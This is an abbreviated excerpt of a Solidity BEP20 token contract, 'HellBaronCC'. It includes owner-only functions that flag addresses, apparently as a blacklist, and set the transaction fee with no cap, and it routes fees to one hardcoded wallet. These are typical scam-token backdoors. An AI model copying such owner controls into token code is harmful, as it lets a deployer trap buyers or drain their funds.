...
contract Hhroncc is IBEP20, Auth {
    ...
    string constant _name = "HellBaronCC";
    string constant _symbol = "Hhroncc";
    ...
    address private marketingFeeReceiver = 0x4D97211a88d4dcd2d973A5FDbaACF0281519512F;
    address private buybackFeeReceiver = 0x4D97211a88d4dcd2d973A5FDbaACF0281519512F;
    ...
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Hhroncc seems to happen Insufficient Allowance!!!!");
        }
    ...
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Hhroncc seems to happen Insufficient Balance!!!!");
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (recipient != UniswapV2Pair && recipient != DEAD && sender != owner && recipient != owner) {
            require(isTxLimitExempt[recipient] || _balances[recipient] + amount <= _maxWalletSize, "Hhroncc Transfer seems to happen amount exceeds the bag size!!!!");
        }
    ...
    function checkTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isTxLimitExempt[sender], "Hhroncc TX Limit Exceeded");
    }
    ...
    function swapBack() internal swapping {
        ...
        require(MarketingSuccess, "Hhroncc receiver rejected ETH transfer");
        (bool BuyBackSuccess, /* bytes memory data */) = payable(buybackFeeReceiver).call{value : amountBNBbuyback, gas : 30000}("");
        require(BuyBackSuccess, "Hhroncc receiver rejected ETH transfer");
    ...
    function setDLHhroncc(address addr, bool bv) external onlyOwner {
        isBBB[addr] = bv;
    }

    function setDEHhroncc(uint256 fe) external onlyOwner {
        totalFee = fe;
    }
    ...
    function transferForeignTokenHhroncc(address _token) public authorized {
        require(_token != address(this), "Hhroncc Can't let you take all native token");
    ...
    function isOverLiquifiedHhroncc(uint256 target, uint256 accuracy) public view returns (bool) {
